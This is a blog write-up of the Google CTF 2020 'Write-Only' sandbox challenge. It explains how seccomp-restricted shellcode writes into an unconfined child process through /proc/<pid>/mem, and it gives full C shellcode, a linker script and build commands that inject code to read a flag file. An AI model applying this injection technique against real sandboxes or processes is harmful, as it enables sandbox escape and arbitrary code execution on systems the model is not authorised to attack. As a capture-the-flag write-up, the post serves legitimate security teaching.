---
layout: post
title:  "Writeonly - sandbox (Google CTF 2020)"
date:   2020-09-05 18:15:00 +03:00
categories: writeups
author: Joey Geralnik
tags: sandbox
---

This is a writeup of the challenge Write-Only from the 2020 Google CTF. Our major contribution is that all of our shellcodes are written in C instead of assembly (a useful trick in general...)

## The challenge

We were given a service that takes shellcode and runs it. The only problem is that there is a seccomp filter that is applied before running our shellcode that prevents using the `read` syscall

```c
void setup_seccomp() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_KILL);
  int ret = 0;
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(stat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lstat), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lseek), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(writev), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(access), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(sched_yield), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(dup), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(dup2), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(clone), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fork), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(vfork), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(kill), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(chdir), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fchdir), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(gettimeofday), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getuid), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getgid), 0);
  ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
  ret |= seccomp_load(ctx);
  if (ret) {
    exit(1);
  }
}
```

Before applying the seccomp filter the main binary `fork`s and creates a new process that runs in an infinite loop

```c
int main(int argc, char *argv[]) {
  pid_t pid = check(fork(), "fork");
  if (!pid) {
    while (1) {
      check_flag();
    }
    return 0;
  }

  printf("[DEBUG] child pid: %d\n", pid);
  void_fn sc = read_shellcode();
  setup_seccomp();
  sc();

  return 0;
}
```

The key to the solution is that the `open` and `write` syscalls are available. We can open the memory of the child process with `/proc/<PID>/mem`, and replace the running code with more shellcode. The child process is not confined by seccomp and can simply open the flag.

## Writing our shellcode in C

We need to write 2 shellcodes - the first shellcode will run in the parent process, and needs to inject shellcode into the child process that will read the flag.

Rather than writing shellcode in assembly, we decided to write it in C and get the compiler to do the hard work for us.

Here's what our code looks like:

```c
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

extern char __start_inner_shellcode;
extern char __stop_inner_shellcode;

inline long my_syscall (long a, long b, long c, long d) {
    register long rax __asm__ ("rax") = a;
    register long rdi __asm__ ("rdi") = b;
    register long rsi __asm__ ("rsi") = c;
    register long rdx __asm__ ("rdx") = d;
    __asm__ __volatile__ (
        "syscall"
        : "+r" (rax)
        : "r" (rdi), "r" (rsi), "r" (rdx)
        : "cc", "rcx", "r11", "memory"
    );
    return rax;
}

#define my_open(path, flags) my_syscall(SYS_open, (long)path, flags, 0)
#define my_lseek(fd, offset, whence) my_syscall(SYS_lseek, fd, offset, whence)
#define my_write(fd, buf, size) my_syscall(SYS_write, fd, (long)buf, size)
#define my_read(fd, buf, size) my_syscall(SYS_read, fd, (long)buf, size)

int my_write_str(int fd, char* str) {
    int len = 0;
    char *end = str;
    while(*end++) len++;
    return my_write(fd, str, len);
}

void inner_shellcode(void) {
    char buffer[4096];
    int fd = my_open("/home/user/flag", O_RDONLY);
    my_read(fd, buffer, sizeof(buffer));
    my_write_str(1, "Got flag:");
    my_write_str(1, buffer);
    my_write(1, "\n", 1);
    while(1);
}

void _start(void) {
    char *addr;
    int pid;

    __asm__ __volatile__ (
        "movl -4(%%rbp), %1;"
        "movq -40(%%rbp), %0;"
        : "=r" (addr), "=r"(pid)
    );
    char* base = addr - 0x402356;
    void (*myasprintf)(char**, char*, long) = (void*)(base + 0x412F10);
    my_write_str(1, "hello\n");
    char *pid_buf;
    myasprintf(&pid_buf, "/proc/%d/mem", pid);
    my_write_str(1, pid_buf);
    my_write(1, "\n", 1);
    int fd = my_open(pid_buf, O_WRONLY);

    char* shellcode = &__start_inner_shellcode;
    char* stop_shellcode = &__stop_inner_shellcode;

    char *target_addr = base + 0x40223A;
    my_lseek(fd, (off_t)target_addr, SEEK_SET);

    // Make sure that the child process is no longer in the critical section
    my_write_str(1, "Going to sleep\n");
    for(volatile unsigned int i=0; i < (1 << 20); i++);
    my_write_str(1, "Done sleeping\n");

    my_write(fd, shellcode, stop_shellcode - shellcode);

    my_write_str(1, "wait for flag...\n");

    // Wait for child to exit sleep
    while(1);
}
```

The only assembly we need wrote is hacky wrappers around syscalls (which we could probably have automated this as well) and code to get the PID and base address of the binary off of the stack. In practice we didn't need the PID from the stack because it was always 2, but this code let us test locally outside of namespaces. Because the outer shellcode runs directly in the process of the challenge binary, we can call its functions directly like we did with asprintf (which we use to format the pid in /proc/<PID>/mem, again we could have just used 2 hardcoded).

The real magic happens in the linker. We compile the code with `-ffunction-sections` and `-fdata-sections` so that each function's code and data is placed in a seperate section in the ELF. We then use the following linker script:

```shell
SECTIONS
{
    raw_shellcode :
    {
        *(.text._start*)
        *(.rodata._start*)
        __start_inner_shellcode = .;
        *(.text.inner_shellcode*)
        *(.rodata.inner_shellcode*)
        *(.text*)
        __stop_inner_shellcode = .;
    }
}

```

This creates a section called `raw_shellcode` that starts with the `_start` function and its data, followed by the inner shellcode and all of the common functions (in particular `my_write_str`). The linker defines `__start_inner_shellcode` before the address of the inner_shellcode and `__stop_inner_shellcode` at the end. This allows us to use `&__start_inner_shellcode` in our C code to reference the beginning of our inner shellcode. Because the data is packed together with the code we don't need to worry about the code accidentally accessing global strings that are outside of our shellcode.

Finally we can compile our code with:

```shell
gcc writeonly.c -static -Os -o writeonly.elf -nostdlib -fdata-sections -ffunction-sections -Wl,-Tscript.ld
objcopy -j raw_shellcode -O binary writeonly.elf writeonly.bin
```

`script.ld` is out linker script and `writeonly.c` is our code. After compiling our code, we use objcopy to extract the `raw_shellcode` section which should can send to the server to win the challenge.

## Tiny little detail

The other minor detail we glossed over is that our shellcode must be small enough to not ruin the child process. The child is executing sleep, and when it finishes the sleep should loop back to the beginning of our shellcode. If our shellcode is too big we will overwrite the instruction after the call to sleep and the sleep will return to garbage code. Luckily our shellcode is small enough so all is well

## Gimme the flag

Sending our code to the server returns the flag: `CTF{why_read_when_you_can_write}`
